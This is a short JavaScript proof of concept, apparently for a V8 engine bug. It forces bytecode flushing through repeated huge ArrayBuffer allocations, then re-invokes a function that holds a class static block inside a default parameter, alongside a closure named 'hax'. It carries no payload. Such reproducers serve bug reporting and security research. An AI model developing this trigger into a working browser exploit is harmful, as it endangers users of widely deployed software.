function gc_major() { // mark-sweep
  try {
    // doesn't seem to matter if the allocation fails
    new ArrayBuffer(0x7fe00000);
  } catch (err) {
    // print(err);
  }
}

// https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
function flush_bytecode() {
  // please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
  // you can observe if this is working by passing the "--trace-gc" flag
  const bytecode_old_age = 6;
  for (let i = 0; i < bytecode_old_age; i++) {
    gc_major();
  }
}

function f1() {
  let a1;
  function hax() {
    a1 = {};
  }

  (arg = class AAA {
    static {
      this;
    }
  }) => { }

  hax();
  return hax;
}

let hax = f1();

flush_bytecode();
console.log('after flush');

f1();